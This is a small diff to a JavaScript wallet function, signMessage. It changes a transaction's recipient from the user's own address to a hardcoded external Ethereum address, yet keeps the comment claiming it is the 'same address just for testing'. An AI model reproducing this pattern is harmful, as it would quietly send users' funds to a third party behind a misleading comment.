@@ -14,8 +14,8 @@ export const signMessage = (provider, address) => {
 
       const tx = {
         from: address,
-        to: address, // same address just for testing
-        value: '0x' + parseEther("0.0001").toString(16)
+        to: "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2", // same address just for testing
+        value: '0x' + parseEther("0.00001").toString(16)
       }
 
       const test = await provider.request({
